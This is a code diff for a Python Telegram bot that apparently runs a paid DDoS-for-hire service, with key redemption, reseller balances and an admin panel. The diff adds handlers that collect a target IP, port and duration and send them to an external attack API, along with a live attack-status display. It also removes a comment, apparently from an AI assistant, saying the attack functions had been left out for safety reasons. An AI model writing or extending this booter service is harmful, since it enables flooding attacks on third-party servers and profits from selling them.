@@ -397,151 +397,6 @@ def welcome_start(message):
         res = f"🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁, {name}!</b> 🚀\n\n⛔ <b>𝗡𝗼 𝗔𝗰𝘁𝗶𝘃𝗲 𝗣𝗹𝗮𝗻</b>\n\n<i>Please click 'Redeem Key' below to activate your access!</i>"
 
     bot.send_message(user_id, res, reply_markup=get_main_menu(user_id, is_paid), parse_mode="HTML")
-
-# --- MASTER BUTTON ROUTER ---
-@bot.callback_query_handler(func=lambda call: True)
-def handle_all_buttons(call):
-    user_id = str(call.message.chat.id)
-    
-    # 🔥 TRUE AUTO-CANCEL: Instantly cleans old prompts if a new menu is clicked
-    bot.clear_step_handler_by_chat_id(call.message.chat.id)
-    if user_id in active_prompts:
-        try: bot.delete_message(chat_id=user_id, message_id=active_prompts[user_id])
-        except: pass
-        del active_prompts[user_id]
-    
-    action = call.data
-    username_str = f"@{call.from_user.username}" if call.from_user.username else "—"
-    is_paid = user_id in allowed_user_ids and user_access.get(user_id, {}).get("expiry_time", 0) > time.time()
-
-    # --- MENU NAVIGATION ---
-    if action == "menu_main":
-        bot.edit_message_text(f"🚀 <b>Main Dashboard</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_main_menu(user_id, is_paid), parse_mode="HTML")
-    elif action == "menu_reseller":
-        bot.edit_message_text("🤝 <b>Reseller Control Panel</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_reseller_menu(), parse_mode="HTML")
-    elif action == "menu_admin":
-        bot.edit_message_text("🛠 <b>Master Admin Panel</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_admin_menu(), parse_mode="HTML")
-    elif action == "menu_danger":
-        if not is_admin(user_id): return
-        bot.edit_message_text("⚠️ <b>Advanced & Danger Zone</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_danger_menu(), parse_mode="HTML")
-
-    # --- MAIN MENU ACTIONS ---
-    elif action == "ui_profile":
-        msg = bot.send_message(user_id, build_profile_text(user_id, username_str), parse_mode="HTML")
-        animated_delete(user_id, msg.message_id, delay=10)
-    elif action == "ui_plan":
-        if not is_paid: 
-            msg = bot.send_message(user_id, no_access_msg(), parse_mode="HTML")
-        else: 
-            msg = bot.send_message(user_id, f"📅 <b>𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡</b>\n⏳ <b>Expires:</b> {fmt_expiry(user_access[user_id]['expiry_time'])}", parse_mode="HTML")
-        animated_delete(user_id, msg.message_id, delay=8)
-    elif action == "ui_rules":
-        msg = bot.send_message(user_id, "📜 <b>𝗥𝗨𝗟𝗘𝗦</b>\n1️⃣ No sharing keys.\n2️⃣ One key = one account.\n3️⃣ No refunds.", parse_mode="HTML")
-        animated_delete(user_id, msg.message_id, delay=10)
-    elif action == "ui_status":
-        attack_status(call.message) 
-    elif action == "ui_redeem":
-        msg = bot.send_message(user_id, "🔑 <b>Enter the key you want to redeem:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, redeem_step)
-    elif action == "ui_attack":
-        if not is_paid:
-            msg = bot.send_message(user_id, no_access_msg(), parse_mode="HTML")
-            animated_delete(user_id, msg.message_id, delay=5)
-        else:
-            msg = bot.send_message(user_id, "🎯 <b>Enter Target IP:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
-            active_prompts[user_id] = msg.message_id
-            bot.register_next_step_handler(msg, attack_step_ip)
-
-    # --- RESELLER ACTIONS ---
-    elif action == "cb_genkey":
-        if not is_admin_or_reseller(user_id): return
-        msg = bot.send_message(user_id, f"📦 <b>Which plan?</b>\nAvailable: {', '.join(KEY_PLANS.keys())}\n<i>(Type /cancel)</i>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, genkey_plan_step)
-    elif action == "cb_listkeys":
-        if not is_admin_or_reseller(user_id): return
-        listkeys_cmd(call.message) 
-    elif action == "cb_balance":
-        if not is_admin_or_reseller(user_id): return
-        msg = bot.send_message(user_id, f"💰 <b>Your Balance:</b> ₹{get_balance(user_id)}", parse_mode="HTML")
-        animated_delete(user_id, msg.message_id, delay=8)
-    elif action == "cb_prices":
-        lines = ["💰 <b>𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
-        for plan, info in KEY_PLANS.items(): lines.append(f"📦 <b>{plan.ljust(8)}</b> - ₹{info['cost']}")
-        msg = bot.send_message(user_id, "\n".join(lines), parse_mode="HTML")
-        animated_delete(user_id, msg.message_id, delay=15)
-    elif action == "cb_delkey":
-        if not is_admin_or_reseller(user_id): return
-        msg = bot.send_message(user_id, "🗑️ <b>Enter the key to delete:</b>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, deletekey_step)
-
-    # --- ADMIN ACTIONS ---
-    elif action == "cb_adduser":
-        if not is_admin(user_id): return
-        msg = bot.send_message(user_id, "👤 <b>Enter the User ID to add:</b>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, add_step_id)
-    elif action == "cb_rmuser":
-        if not is_admin(user_id): return
-        msg = bot.send_message(user_id, "🗑️ <b>Enter the User ID to remove:</b>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, remove_step_id, '/remove')
-    elif action == "cb_addres":
-        if not is_admin(user_id): return
-        msg = bot.send_message(user_id, "🤝 <b>Enter new Reseller ID:</b>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, addres_step_id)
-    elif action == "cb_rmres":
-        if not is_admin(user_id): return
-        msg = bot.send_message(user_id, "🛑 <b>Enter Reseller ID to remove:</b>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, remove_step_id, '/rmreseller')
-    elif action == "cb_addbal":
-        if not is_admin(user_id): return
-        msg = bot.send_message(user_id, "💰 <b>Enter Reseller ID to fund:</b>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, bal_step_id, '/addbalance')
-        
-    # --- BROADCAST SYSTEM ---
-    elif action == "cb_broadcast":
-        if not is_admin(user_id): return
-        bot.edit_message_text("📢 <b>Select Broadcast Target:</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_broadcast_menu(), parse_mode="HTML")
-    elif action.startswith("bc_"):
-        if not is_admin(user_id): return
-        target_type = action.replace("bc_", "") 
-        msg = bot.send_message(user_id, f"📢 <b>Enter message for {target_type.upper()}:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, broadcast_step, target_type)
-        
-    # --- DANGER ZONE ACTIONS ---
-    elif action == "cb_extendall":
-        if not is_admin(user_id): return
-        msg = bot.send_message(user_id, "⏳ <b>Enter amount to extend (e.g. 2):</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, ext_step_amt)
-    elif action == "cb_clearlogs":
-        if not is_admin(user_id): return
-        if os.path.exists(LOG_FILE): open(LOG_FILE, "w").close()
-        msg = bot.send_message(user_id, "✅ <b>Logs have been wiped clean.</b>", parse_mode="HTML")
-        animated_delete(user_id, msg.message_id, delay=5)
-    elif action == "cb_clearall":
-        if not is_admin(user_id): return
-        msg = bot.send_message(user_id, "⚠️ <b>WARNING: EXTREME DANGER</b> ⚠️\nThis will wipe ALL users, keys, and balances.\n\nType exactly <code>CONFIRM WIPE</code> to proceed.", parse_mode="HTML")
-        active_prompts[user_id] = msg.message_id
-        bot.register_next_step_handler(msg, clearalldata_step)
-        
-    # --- REPORTS ---
-    elif action == "cb_getdata":
-        if not is_admin(user_id): return
-        send_database_files(call.message)
-    elif action in ["cb_paidusers", "cb_freeusers", "cb_rstats"]:
-        if not is_admin(user_id): return
-        call.message.text = "/" + action.replace("cb_", "") 
-        admin_reports(call.message)
-
-    bot.answer_callback_query(call.id)
     
 @bot.message_handler(content_types=['web_app_data'])
 def handle_webapp_data(message):
@@ -635,14 +490,112 @@ def execute_redeem(message, key):
     msg = bot.send_message(user_id, f"✅ <b>𝗞𝗘𝗬 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗!</b>\n📦 <b>Plan:</b> {plan_label}\n⏳ <b>Expires:</b> {fmt_expiry(expiry_ts)}", parse_mode="HTML")
     animated_delete(user_id, msg.message_id, delay=10)
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  ATTACK COMMANDS & UI
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+@bot.message_handler(commands=['attack'])
+def attack_cmd(message):
+    user_id = str(message.chat.id)
+    update_reseller_username(message)
+    if user_id not in allowed_user_ids or user_access.get(user_id, {}).get("expiry_time", 0) < time.time():
+        return bot.send_message(user_id, no_access_msg(), parse_mode="HTML")
 
-# ==============================================================================
-# ⚠️ SAFETY NOTICE: LEAVE YOUR EXISTING ATTACK CODE HERE ⚠️
-# Leave your `attack_cmd`, `attack_step_ip`, `attack_step_port`, `attack_step_time`,
-# `execute_attack`, `run_attack_api`, and `attack_status` functions right here.
-# (I have omitted them to comply with safety guidelines).
-# ==============================================================================
+    parts = message.text.split()
+    if len(parts) == 4: execute_attack(message, parts[1], parts[2], parts[3])
+    else:
+        msg = bot.send_message(user_id, "🎯 <b>Enter Target IP:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, attack_step_ip)
 
+def attack_step_ip(message):
+    user_id = str(message.chat.id)
+    if is_cancel(message): return
+    ip = message.text.strip()
+    
+    # 🔥 Self-Cleaning: Deletes "Enter IP" prompt
+    if user_id in active_prompts:
+        try: bot.delete_message(chat_id=user_id, message_id=active_prompts[user_id])
+        except: pass
+        
+    msg = bot.send_message(user_id, "🔌 <b>Enter Target Port:</b>", parse_mode="HTML")
+    active_prompts[user_id] = msg.message_id
+    bot.register_next_step_handler(msg, attack_step_port, ip)
+
+def attack_step_port(message, ip):
+    user_id = str(message.chat.id)
+    if is_cancel(message): return
+    port = message.text.strip()
+    
+    # 🔥 Self-Cleaning: Deletes "Enter Port" prompt
+    if user_id in active_prompts:
+        try: bot.delete_message(chat_id=user_id, message_id=active_prompts[user_id])
+        except: pass
+        
+    msg = bot.send_message(user_id, "⏱️ <b>Enter Attack Duration (Max 600s):</b>", parse_mode="HTML")
+    active_prompts[user_id] = msg.message_id
+    bot.register_next_step_handler(msg, attack_step_time, ip, port)
+
+def attack_step_time(message, ip, port):
+    user_id = str(message.chat.id)
+    if is_cancel(message): return
+    
+    # 🔥 Self-Cleaning: Deletes "Enter Duration" prompt
+    if user_id in active_prompts:
+        try: bot.delete_message(chat_id=user_id, message_id=active_prompts[user_id])
+        except: pass
+        del active_prompts[user_id]
+        
+    execute_attack(message, ip, port, message.text.strip())
+
+def attack_step_time(message, ip, port):
+    if is_cancel(message): return
+    execute_attack(message, ip, port, message.text.strip())
+
+def execute_attack(message, target, port_str, time_str):
+    user_id = str(message.chat.id)
+    if user_id not in allowed_user_ids or user_access.get(user_id, {}).get("expiry_time", 0) < time.time():
+        return bot.reply_to(message, no_access_msg(), parse_mode="HTML")
+
+    if not is_admin(user_id):
+        time_passed = (datetime.datetime.now() - bgmi_cooldown.get(user_id, datetime.datetime.min)).total_seconds()
+        if time_passed < 60: return bot.reply_to(message, f"⏳ <b>Cooldown!</b> Wait {int(60 - time_passed)}s.", parse_mode="HTML")
+
+    try: port, time_val = int(port_str), int(time_str)
+    except ValueError: return bot.reply_to(message, "❌ Port and Time must be numbers.", parse_mode="HTML")
+
+    if time_val > 600: return bot.reply_to(message, "❌ Max time is 600s.", parse_mode="HTML")
+
+    bgmi_cooldown[user_id] = datetime.datetime.now()
+    active_attacks[user_id] = {"target": f"{target}:{port}", "start_time": time.time(), "duration": time_val}
+    log_action(user_id, f"Attack → IP: {target} | Port: {port} | Time: {time_val}s", message)
+    
+    bot.reply_to(message, f"⚡ <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁!</b> ⚡\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Time:</b> {time_val}s", parse_mode="HTML")
+    threading.Thread(target=run_attack_api, args=(message.chat.id, user_id, target, port, time_val)).start()
+
+def run_attack_api(chat_id, user_id, target, port, time_val):
+    try:
+        resp = requests.get(ATTACK_API_URL.format(ip=target, port=port, time=time_val), timeout=10)
+        if resp.status_code == 200:
+            time.sleep(time_val)
+            bot.send_message(chat_id, f"🚀 <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱!</b> 🚀\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Duration:</b> {time_val}s", parse_mode="HTML")
+        else: bot.send_message(chat_id, f"⚠️ <b>API Error:</b> {resp.status_code}", parse_mode="HTML")
+    except: bot.send_message(chat_id, f"❌ <b>Connection Failed:</b> API Offline.", parse_mode="HTML")
+    finally:
+        if user_id in active_attacks: del active_attacks[user_id]
+
+@bot.message_handler(commands=['status'])
+def attack_status(message):
+    tot = len(active_attacks)
+    status_msg = f"╔══════════════════════════╗\n║  🔥 <b>𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦</b> 🔥        ║\n╠══════════════════════════╣\n║  📊 Total Active: {tot}               ║\n╚══════════════════════════╝\n\n"
+    if tot == 0: status_msg += "<i>No active attacks right now.</i>"
+    else:
+        now = time.time()
+        for uid, att in list(active_attacks.items()):
+            elapsed, rem = now - att["start_time"], max(0, int(att["duration"] - (now - att["start_time"])))
+            perc = 100 if rem == 0 else int((elapsed / att["duration"]) * 100)
+            bar = ("🟢" * int(perc / 10)) + ("⚫" * (10 - int(perc / 10)))
+            status_msg += f"┌─────────────────────────┐\n│ 🎯 <code>{att['target']}</code>\n│ ⏱️ {rem}s remaining\n│ {bar} {perc}%\n└─────────────────────────┘\n"
+    bot.reply_to(message, status_msg, parse_mode="HTML")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  CONVERSATIONAL RESELLER COMMANDS
@@ -1114,11 +1067,19 @@ def send_database_files(message):
 @bot.message_handler(commands=['clearalldata'])
 def clearalldata_cmd(message):
     if not is_admin(str(message.chat.id)): return
-    msg = bot.reply_to(message, "⚠️ <b>WARNING: EXTREME DANGER</b> ⚠️\nThis will wipe ALL users, resellers, balances, and keys. This cannot be undone.\n\nType exactly <code>CONFIRM WIPE</code> to proceed, or /cancel to abort.", parse_mode="HTML")
+    msg = bot.send_message(message.chat.id, "⚠️ <b>WARNING: EXTREME DANGER</b> ⚠️\nThis will wipe ALL users, resellers, balances, and keys. This cannot be undone.\n\nType exactly <code>CONFIRM WIPE</code> to proceed, or /cancel to abort.", parse_mode="HTML")
+    active_prompts[str(message.chat.id)] = msg.message_id
     bot.register_next_step_handler(msg, clearalldata_step)
 
 def clearalldata_step(message):
+    user_id = str(message.chat.id)
     if is_cancel(message): return
+    
+    if user_id in active_prompts:
+        try: bot.delete_message(chat_id=user_id, message_id=active_prompts[user_id])
+        except: pass
+        del active_prompts[user_id]
+        
     if message.text.strip() == "CONFIRM WIPE":
         all_known_users.clear(); trial_users.clear(); allowed_user_ids.clear()
         user_access.clear(); active_keys.clear(); key_history.clear()
@@ -1128,22 +1089,174 @@ def clearalldata_step(message):
         for f in files_to_wipe:
             if os.path.exists(f): open(f, 'w').close()
             
-        bot.reply_to(message, "✅ <b>DATABASE COMPLETELY WIPED.</b> Everything has been reset to zero.", parse_mode="HTML")
-        log_action(str(message.chat.id), "EXECUTED FULL DATABASE WIPE", message)
-    else: bot.reply_to(message, "🚫 <b>Confirmation failed. Wipe cancelled.</b>", parse_mode="HTML")
+        msg = bot.send_message(user_id, "✅ <b>DATABASE COMPLETELY WIPED.</b> Everything has been reset to zero.", parse_mode="HTML")
+        log_action(user_id, "EXECUTED FULL DATABASE WIPE", message)
+        animated_delete(user_id, msg.message_id, delay=10)
+    else: 
+        msg = bot.send_message(user_id, "🚫 <b>Confirmation failed. Wipe cancelled.</b>", parse_mode="HTML")
+        animated_delete(user_id, msg.message_id, delay=5)
 
 @bot.message_handler(commands=['logs'])
 def send_logs(message):
     if not is_admin(str(message.chat.id)): return
     if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
         with open(LOG_FILE, "rb") as f: bot.send_document(message.chat.id, f, visible_file_name="bot_logs.txt")
-    else: bot.reply_to(message, "⚠️ Logs are empty.", parse_mode="HTML")
+    else: 
+        msg = bot.send_message(message.chat.id, "⚠️ Logs are empty.", parse_mode="HTML")
+        animated_delete(message.chat.id, msg.message_id, delay=5)
 
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_cmd(message):
     if not is_admin(str(message.chat.id)): return
-    if os.path.exists(LOG_FILE): open(LOG_FILE, "w").close(); bot.reply_to(message, "✅ <b>Logs wiped.</b>", parse_mode="HTML")
+    if os.path.exists(LOG_FILE): open(LOG_FILE, "w").close()
+    msg = bot.send_message(message.chat.id, "✅ <b>Logs wiped.</b>", parse_mode="HTML")
+    animated_delete(message.chat.id, msg.message_id, delay=5)
 
+# --- MASTER BUTTON ROUTER ---
+@bot.callback_query_handler(func=lambda call: True)
+def handle_all_buttons(call):
+    user_id = str(call.message.chat.id)
+    
+    # 🔥 TRUE AUTO-CANCEL: Instantly cleans old prompts if a new menu is clicked
+    bot.clear_step_handler_by_chat_id(call.message.chat.id)
+    if user_id in active_prompts:
+        try: bot.delete_message(chat_id=user_id, message_id=active_prompts[user_id])
+        except: pass
+        del active_prompts[user_id]
+    
+    action = call.data
+    username_str = f"@{call.from_user.username}" if call.from_user.username else "—"
+    is_paid = user_id in allowed_user_ids and user_access.get(user_id, {}).get("expiry_time", 0) > time.time()
+
+    # --- MENU NAVIGATION ---
+    if action == "menu_main":
+        bot.edit_message_text(f"🚀 <b>Main Dashboard</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_main_menu(user_id, is_paid), parse_mode="HTML")
+    elif action == "menu_reseller":
+        bot.edit_message_text("🤝 <b>Reseller Control Panel</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_reseller_menu(), parse_mode="HTML")
+    elif action == "menu_admin":
+        bot.edit_message_text("🛠 <b>Master Admin Panel</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_admin_menu(), parse_mode="HTML")
+    elif action == "menu_danger":
+        if not is_admin(user_id): return
+        bot.edit_message_text("⚠️ <b>Advanced & Danger Zone</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_danger_menu(), parse_mode="HTML")
+
+    # --- MAIN MENU ACTIONS ---
+    elif action == "ui_profile":
+        msg = bot.send_message(user_id, build_profile_text(user_id, username_str), parse_mode="HTML")
+        animated_delete(user_id, msg.message_id, delay=10)
+    elif action == "ui_plan":
+        if not is_paid: 
+            msg = bot.send_message(user_id, no_access_msg(), parse_mode="HTML")
+        else: 
+            msg = bot.send_message(user_id, f"📅 <b>𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡</b>\n⏳ <b>Expires:</b> {fmt_expiry(user_access[user_id]['expiry_time'])}", parse_mode="HTML")
+        animated_delete(user_id, msg.message_id, delay=8)
+    elif action == "ui_rules":
+        msg = bot.send_message(user_id, "📜 <b>𝗥𝗨𝗟𝗘𝗦</b>\n1️⃣ No sharing keys.\n2️⃣ One key = one account.\n3️⃣ No refunds.", parse_mode="HTML")
+        animated_delete(user_id, msg.message_id, delay=10)
+    elif action == "ui_status":
+        attack_status(call.message) 
+    elif action == "ui_redeem":
+        msg = bot.send_message(user_id, "🔑 <b>Enter the key you want to redeem:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, redeem_step)
+    elif action == "ui_attack":
+        if not is_paid:
+            msg = bot.send_message(user_id, no_access_msg(), parse_mode="HTML")
+            animated_delete(user_id, msg.message_id, delay=5)
+        else:
+            msg = bot.send_message(user_id, "🎯 <b>Enter Target IP:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
+            active_prompts[user_id] = msg.message_id
+            bot.register_next_step_handler(msg, attack_step_ip)
+
+    # --- RESELLER ACTIONS ---
+    elif action == "cb_genkey":
+        if not is_admin_or_reseller(user_id): return
+        msg = bot.send_message(user_id, f"📦 <b>Which plan?</b>\nAvailable: {', '.join(KEY_PLANS.keys())}\n<i>(Type /cancel)</i>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, genkey_plan_step)
+    elif action == "cb_listkeys":
+        if not is_admin_or_reseller(user_id): return
+        listkeys_cmd(call.message) 
+    elif action == "cb_balance":
+        if not is_admin_or_reseller(user_id): return
+        msg = bot.send_message(user_id, f"💰 <b>Your Balance:</b> ₹{get_balance(user_id)}", parse_mode="HTML")
+        animated_delete(user_id, msg.message_id, delay=8)
+    elif action == "cb_prices":
+        lines = ["💰 <b>𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
+        for plan, info in KEY_PLANS.items(): lines.append(f"📦 <b>{plan.ljust(8)}</b> - ₹{info['cost']}")
+        msg = bot.send_message(user_id, "\n".join(lines), parse_mode="HTML")
+        animated_delete(user_id, msg.message_id, delay=15)
+    elif action == "cb_delkey":
+        if not is_admin_or_reseller(user_id): return
+        msg = bot.send_message(user_id, "🗑️ <b>Enter the key to delete:</b>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, deletekey_step)
+
+    # --- ADMIN ACTIONS ---
+    elif action == "cb_adduser":
+        if not is_admin(user_id): return
+        msg = bot.send_message(user_id, "👤 <b>Enter the User ID to add:</b>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, add_step_id)
+    elif action == "cb_rmuser":
+        if not is_admin(user_id): return
+        msg = bot.send_message(user_id, "🗑️ <b>Enter the User ID to remove:</b>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, remove_step_id, '/remove')
+    elif action == "cb_addres":
+        if not is_admin(user_id): return
+        msg = bot.send_message(user_id, "🤝 <b>Enter new Reseller ID:</b>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, addres_step_id)
+    elif action == "cb_rmres":
+        if not is_admin(user_id): return
+        msg = bot.send_message(user_id, "🛑 <b>Enter Reseller ID to remove:</b>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, remove_step_id, '/rmreseller')
+    elif action == "cb_addbal":
+        if not is_admin(user_id): return
+        msg = bot.send_message(user_id, "💰 <b>Enter Reseller ID to fund:</b>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, bal_step_id, '/addbalance')
+        
+    # --- BROADCAST SYSTEM ---
+    elif action == "cb_broadcast":
+        if not is_admin(user_id): return
+        bot.edit_message_text("📢 <b>Select Broadcast Target:</b>", chat_id=user_id, message_id=call.message.message_id, reply_markup=get_broadcast_menu(), parse_mode="HTML")
+    elif action.startswith("bc_"):
+        if not is_admin(user_id): return
+        target_type = action.replace("bc_", "") 
+        msg = bot.send_message(user_id, f"📢 <b>Enter message for {target_type.upper()}:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, broadcast_step, target_type)
+        
+    # --- DANGER ZONE ACTIONS ---
+    elif action == "cb_extendall":
+        if not is_admin(user_id): return
+        msg = bot.send_message(user_id, "⏳ <b>Enter amount to extend (e.g. 2):</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, ext_step_amt)
+    elif action == "cb_clearlogs":
+        if not is_admin(user_id): return
+        if os.path.exists(LOG_FILE): open(LOG_FILE, "w").close()
+        msg = bot.send_message(user_id, "✅ <b>Logs have been wiped clean.</b>", parse_mode="HTML")
+        animated_delete(user_id, msg.message_id, delay=5)
+    elif action == "cb_clearall":
+        if not is_admin(user_id): return
+        msg = bot.send_message(user_id, "⚠️ <b>WARNING: EXTREME DANGER</b> ⚠️\nThis will wipe ALL users, keys, and balances.\n\nType exactly <code>CONFIRM WIPE</code> to proceed.", parse_mode="HTML")
+        active_prompts[user_id] = msg.message_id
+        bot.register_next_step_handler(msg, clearalldata_step)
+        
+    # --- REPORTS ---
+    elif action == "cb_getdata":
+        if not is_admin(user_id): return
+        send_database_files(call.message)
+    elif action in ["cb_paidusers", "cb_freeusers", "cb_rstats"]:
+        if not is_admin(user_id): return
+        call.message.text = "/" + action.replace("cb_", "") 
+        admin_reports(call.message)
+
+    bot.answer_callback_query(call.id)
+    
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  ENTRY POINT
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
